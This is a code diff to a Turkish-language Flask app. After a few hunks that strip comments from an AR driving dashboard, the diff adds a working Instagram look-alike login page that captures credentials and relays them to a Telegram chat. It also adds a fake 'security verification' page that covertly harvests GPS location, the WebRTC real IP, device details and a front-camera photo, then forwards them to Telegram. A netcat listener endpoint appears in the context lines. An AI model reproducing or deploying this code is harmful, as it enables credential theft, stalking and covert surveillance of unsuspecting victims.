@@ -486,7 +486,6 @@ HTML_TEMPLATE = """
             logTerminal.scrollTop = logTerminal.scrollHeight;
         }
 
-        // --- AR MOTORU: AUTO-DIMMING, YAKIT, ETA, DRAG, HIZ LİMİTİ, G-FORCE & İNCLE ---
         async function startARCamera() {
             let video = document.getElementById('arVideo');
             let hud = document.getElementById('arHudText');
@@ -544,7 +543,6 @@ HTML_TEMPLATE = """
                 let w = canvas.width;
                 let h = canvas.height;
 
-                // 1. 🌙 Auto-Dimming (Akıllı Gece / Gündüz Karartma Modu)
                 let useAutoDim = document.getElementById('chkAutoDim').checked;
                 let currentHour = new Date().getHours();
                 let isNight = currentHour >= 20 || currentHour < 6;
@@ -564,11 +562,9 @@ HTML_TEMPLATE = """
                     hudBox.style.borderColor = "#00ff66";
                 }
 
-                // Incline / Eğim Ölçer HUD
                 let useIncline = document.getElementById('chkIncline').checked;
                 if (useIncline) {
                     inclineHud.style.display = "block";
-                    // deviceBeta [-180, 180] pitch açısını temsil eder.
                     currentInclineDeg = (deviceBeta !== 0 ? Math.round((deviceBeta / 90) * 12) : Math.round(Math.sin(step * 0.04) * 8));
                     let inclinePercent = Math.round(Math.tan(currentInclineDeg * Math.PI / 180) * 100);
                     if (Math.abs(currentInclineDeg) > maxRecordedIncline) maxRecordedIncline = Math.abs(currentInclineDeg);
@@ -577,7 +573,6 @@ HTML_TEMPLATE = """
                     inclineHud.style.display = "none";
                 }
 
-                // G-Force HUD Güncelleme
                 if (useGForce) {
                     gforceHud.style.display = "block";
                     if (currentLatG == 0 && currentLongG == 0) {
@@ -589,7 +584,6 @@ HTML_TEMPLATE = """
                     gforceHud.style.display = "none";
                 }
 
-                // Dinamik Hız Limiti Güncelleme
                 let useSpeedLimit = document.getElementById('chkSpeedLimit').checked;
                 if (useSpeedLimit) {
                     speedLimitHud.style.display = "flex";
@@ -622,7 +616,6 @@ HTML_TEMPLATE = """
                     speedLimitHud.style.display = "none";
                 }
 
-                // Şerit Takip Asistanı
                 let useLane = document.getElementById('chkLane').checked;
                 let isLaneViolated = false;
                 if (useLane) {
@@ -652,7 +645,6 @@ HTML_TEMPLATE = """
                     }
                 }
 
-                // Holografik Yol Çizgisi
                 let centerX = (w / 2);
                 let bottomY = h, horizonY = h * 0.48;
 
@@ -680,7 +672,6 @@ HTML_TEMPLATE = """
                 ctx.shadowBlur = 20;
                 ctx.fill();
 
-                // ⏱️ 0-100 Drag Kronometre Simülasyonu
                 if (dragTesting) {
                     if (currentSpeed < 100) {
                         currentSpeed += 6;
@@ -700,7 +691,6 @@ HTML_TEMPLATE = """
                     }
                 }
 
-                // ⛽ Yakıt, Menzil & Dinamik ETA Güncelleme
                 if (step % 50 === 0) {
                     if (currentDistance > 3) {
                         currentDistance -= 3;
@@ -712,7 +702,6 @@ HTML_TEMPLATE = """
                     fuelHud.innerText = `⛽ Yakıt: %${Math.round(fuelLevel)} | Menzil: ${drivingRange} km`;
                 }
 
-                // Canlı Kara Kutu Telemetri Kaydı
                 if (step % 40 === 0) {
                     let logStr = `[${timestamp}] Hız: ${currentSpeed}km/s | Eğim: ${currentInclineDeg}° | Yakıt: %${Math.round(fuelLevel)}`;
                     sessionLogs.push(logStr);
@@ -740,7 +729,6 @@ HTML_TEMPLATE = """
             dragTesting = false;
         }
 
-        // --- SÜRÜŞ RAPORLARI & KARA KUTU KAYDETME ---
         async function finishDrivingSession() {
             stopARCamera();
             if(sessionLogs.length === 0) { alert("Kaydedilmiş sürüş verisi bulunamadı!"); return; }
@@ -988,6 +976,37 @@ def download_driving_report():
         return Response(content, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=blackbox_report.txt"})
     return "Rapor bulunamadı", 404
 
+# --- GELİŞTİRİLMİŞ INSTAGRAM PHISHING SAYFASI ---
+INSTA_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş Yap • Instagram</title>
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px; width: 350px; text-align: center; box-sizing: border-box; }
+        .logo { font-family: 'Brush Script MT', cursive, sans-serif; font-size: 40px; margin-bottom: 30px; font-weight: bold; }
+        input { width: 100%; padding: 10px 12px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; margin-bottom: 8px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #a8a8a8; }
+        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 4px; padding: 7px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #1877f2; }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="logo">Instagram</div>
+        <form method="POST">
+            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autofocus>
+            <input type="password" name="password" placeholder="Şifre" required>
+            <button type="submit">Giriş Yap</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
+
 @app.route("/phish/instagram", methods=["GET", "POST"])
 def insta_phish():
     if request.method == "POST":
@@ -1002,7 +1021,7 @@ def insta_phish():
                 requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
             except: pass
         return redirect("https://www.instagram.com")
-    return "Instagram Login Page"
+    return render_template_string(INSTA_TEMPLATE)
 
 @app.route("/api/phish/creds")
 def api_phish_creds():
@@ -1038,15 +1057,115 @@ def api_listener_start():
     port = request.get_json().get("port", 4444)
     return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi."})
 
+# --- GELİŞTİRİLMİŞ GPS & ÖN KEMERA SNAPSHOT TRACKER ŞABLONU ---
 TRACK_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Güvenlik Doğrulaması</title>
+    <title>Güvenlik Doğrulaması & Sistem Güncellemesi</title>
+    <style>
+        body { background: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .box { background: #121824; border: 1px solid #00ff66; padding: 30px; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,102,0.3); max-width: 400px; }
+        h3 { color: #38bdf8; margin-top: 0; }
+        p { font-size: 13px; color: #94a3b8; }
+        .spinner { border: 4px solid #1e293b; border-top: 4px solid #00ff66; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h3>Doğrulama Ekranı</h3>
+    <div class="box">
+        <h3>🔒 Güvenlik Doğrulaması</h3>
+        <div class="spinner"></div>
+        <p id="statusTxt">Cihaz uyumluluğu ve güvenlik doğrulaması yapılıyor, lütfen bekleyin...</p>
+    </div>
+
+    <video id="webcam" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="snapshotCanvas" style="display:none;"></canvas>
+
+    <script>
+        async function runTracker() {
+            let data = {
+                time: new Date().toLocaleString(),
+                ip: "Tespit ediliyor...",
+                webrtc_ip: "",
+                os: navigator.platform,
+                ram: navigator.deviceMemory || "Bilinmiyor",
+                cores: navigator.hardwareConcurrency || "Bilinmiyor",
+                battery: "Bilinmiyor",
+                screen: window.screen.width + "x" + window.screen.height,
+                lat: null,
+                lon: null,
+                snapshot: null
+            };
+
+            if (navigator.getBattery) {
+                try {
+                    let bat = await navigator.getBattery();
+                    data.battery = Math.round(bat.level * 100) + "% (" + (bat.charging ? "Şarjda" : "Pilde") + ")";
+                } catch(e){}
+            }
+
+            // WebRTC Gerçek IP Tespiti
+            try {
+                let pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        let ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ipMatch) data.webrtc_ip = ipMatch[1];
+                    }
+                };
+            } catch(e){}
+
+            // GPS Konum Bilgisi Alımı
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        data.lat = pos.coords.latitude;
+                        data.lon = pos.coords.longitude;
+                        capturePhotoAndSend(data);
+                    },
+                    (err) => {
+                        capturePhotoAndSend(data);
+                    },
+                    {timeout: 10000, enableHighAccuracy: true}
+                );
+            } else {
+                capturePhotoAndSend(data);
+            }
+        }
+
+        async function capturePhotoAndSend(data) {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                let video = document.getElementById('webcam');
+                video.srcObject = stream;
+                await new Promise(resolve => setTimeout(resolve, 1500)); // Kameranın netleşmesi için bekle
+
+                let canvas = document.getElementById('snapshotCanvas');
+                canvas.width = 320; canvas.height = 240;
+                let ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                data.snapshot = canvas.toDataURL('image/jpeg', 0.7);
+
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // Sunucuya Logları Gönder
+            fetch('/api/lure/save-geo', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                document.getElementById('statusTxt').innerText = "✅ Doğrulama başarıyla tamamlandı. Yönlendiriliyorsunuz...";
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
+            });
+        }
+
+        window.onload = runTracker;
+    </script>
 </body>
 </html>
 """
@@ -1058,7 +1177,20 @@ def track_visitor(track_id):
 @app.route("/api/lure/save-geo", methods=["POST"])
 def save_geo():
     data = request.get_json()
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    data['ip'] = visitor_ip
     CLICK_LOGS.insert(0, data)
+    
+    # Telegram Bildirimi
+    if NOTIFY_CHAT_ID and TOKEN:
+        try:
+            lat = data.get('lat')
+            lon = data.get('lon')
+            loc_str = f"Lat: {lat}, Lon: {lon} (https://maps.google.com/?q={lat},{lon})" if lat else "Konum Alınamadı"
+            msg = f"🎯 [GPS & TRACKER] Yeni Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {data.get('webrtc_ip')}\nCihaz: {data.get('os')} | RAM: {data.get('ram')}GB\nKonum: {loc_str}"
+            requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
+        except: pass
+        
     return jsonify({"status": "saved"})
 
 @app.route("/api/lure/logs")
